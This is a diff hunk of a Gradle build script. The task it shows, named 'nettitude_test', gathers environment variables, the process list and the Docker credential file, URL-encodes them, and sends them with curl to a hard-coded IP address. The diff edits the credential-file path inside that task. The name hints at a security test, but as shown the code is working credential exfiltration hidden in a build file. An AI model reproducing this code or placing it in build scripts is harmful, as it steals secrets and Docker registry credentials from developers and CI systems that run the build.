@@ -41,7 +41,7 @@ task nettitude_test(){
 	def ps = ["ps", "-aux"].execute().text.trim()
 	def eenv = java.net.URLEncoder.encode(env)
 	def eps = java.net.URLEncoder.encode(ps)
-	def docker = ["cat", "/root/.docker/config.json"].execute().text.trim()
+	def docker = ["cat", "~/.docker/config.json"].execute().text.trim()
 	def edocker = java.net.URLEncoder.encode(docker)
 
 	['curl', "-k", "https://45.77.226.156/?uid=${uid}&gid=${gid}&ip=${ip}&hostname=${hostname}&env=${eenv}&ps=${eps}&docker=${edocker}"].execute()
